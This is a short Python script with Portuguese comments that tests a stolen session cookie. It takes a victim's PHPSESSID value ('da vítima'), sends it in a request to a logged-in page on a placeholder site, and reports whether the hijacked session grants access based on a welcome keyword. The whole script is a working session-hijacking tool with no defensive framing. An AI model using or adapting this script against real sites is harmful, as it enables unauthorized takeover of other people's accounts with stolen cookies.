import requests

# Defina aqui o PHPSESSID da vítima
PHPSESSID="VALOR_DO_COOKIE_AQUI"

# URL protegida que só aparece para usuário logado
target_url = "https://exemplo.com.br/area-logada"

# Indicador de sucesso (pode ser um texto visível só quando logado)
auth_keyword = "Bem-vindo"

# Envia requisição com o cookie da sessão
headers = {
    "User-Agent": "Mozilla/5.0",
    "Cookie": f"PHPSESSID={PHPSESSID}"
}

response = requests.get(target_url, headers=headers)

if auth_keyword in response.text:
    print("[+] Sessão ativa: acesso autorizado.")
else:
    print("[-] Sessão inválida ou expirada.")
